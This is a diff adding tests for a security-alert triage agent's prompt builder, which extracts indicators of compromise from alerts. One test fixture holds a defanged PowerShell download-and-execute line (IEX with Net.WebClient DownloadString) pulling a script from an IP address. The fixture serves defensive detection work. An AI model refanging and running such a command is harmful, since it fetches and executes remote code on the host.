@@ -4,6 +4,7 @@ from uuid import uuid4
 from app.agent.prompts import (
     build_draft_canonical_prompt,
     build_draft_experimental_prompt,
+    build_extract_indicators_prompt,
     build_risk_assessment_prompt,
     build_self_check_prompt,
 )
@@ -86,6 +87,20 @@ def test_self_check_prompt_includes_command_context():
     )
 
     assert "185.220.101.1" in prompt
+
+
+def test_extract_indicators_prompt_includes_extra_texts_when_present():
+    prompt = build_extract_indicators_prompt(
+        _make_alert(), extra_texts=["IEX (New-Object Net.WebClient).DownloadString('hxxp://185[.]220[.]101[.]1/a.ps1')"]
+    )
+
+    assert "185[.]220[.]101[.]1" in prompt
+
+
+def test_extract_indicators_prompt_omits_extra_texts_when_absent():
+    prompt = build_extract_indicators_prompt(_make_alert())
+
+    assert "Additional decoded command-line text" not in prompt
 
 
 def test_command_context_fields_are_truncated_in_prompt():
